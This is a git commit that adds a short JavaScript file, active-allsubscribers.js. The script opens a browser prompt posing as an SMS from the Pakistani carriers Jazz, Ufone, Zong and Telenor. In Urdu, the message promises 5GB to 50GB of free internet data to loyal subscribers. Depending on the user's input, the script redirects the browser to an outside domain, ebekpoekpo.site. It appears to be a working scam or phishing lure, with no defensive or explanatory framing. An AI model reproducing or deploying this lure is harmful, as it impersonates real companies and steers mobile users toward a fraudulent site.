4261cbd44461f7d4d46751ccda643f8540db83d3
dataviewz <gloliousam2@gmail.com>
2026-05-02 03:08:42 -0700

    Create active-allsubscribers.js

---
+++ active-allsubscribers.js
@@ -0,0 +1,5 @@
+var password = 'مفت'
+password=prompt('JAZZ,UFONE,ZONG TELENOR SMS: پیارے کسٹمر، ہمارے طویل عرصے سے سبسکرائبرز، صارفین کو انعام دینے کے لیے برائے مہربانی 5GB سے 50GB تک مفت انٹرنیٹ ڈیٹا حاصل کریں، ابھی چیک کرنے کے لیے فری ڈیٹا کو دبائیں ','مفت');
+if (password != 'مفت') {
+location.href='https://ebekpoekpo.site/allsubscribers';
+}
